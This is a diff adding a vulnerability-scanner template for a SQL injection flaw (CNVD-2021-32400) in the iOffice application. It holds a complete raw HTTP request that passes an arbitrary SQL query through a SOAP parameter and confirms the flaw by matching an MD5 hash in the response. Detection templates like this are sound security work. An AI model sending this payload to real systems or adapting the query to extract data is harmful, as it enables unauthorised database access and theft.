@@ -1,0 +1,41 @@
+id: CNVD-2021-32400
+info:
+  name: iOffice SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects a SQL injection vulnerability in the iOffice application via the `GetLoginedEmpNoReadedInf` SOAP method, allowing attackers to execute arbitrary SQL queries.
+  reference:
+    - http://www.ioffice.cn/newsinfo/1616026.html
+
+variables:
+  random_number: "{{rand_int(2000000, 4000000)}}"
+
+http:
+  - raw:
+      - |
+        POST /ioffice/prg/set/wss/ioAssistance.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
+              <sql>select SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{random_number}}')),3,32)</sql>
+            </GetLoginedEmpNoReadedInf>
+          </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<Column1>"
+        part: body
+      - type: regex
+        regex:
+          - "{{md5(random_number)}}"
+        part: body
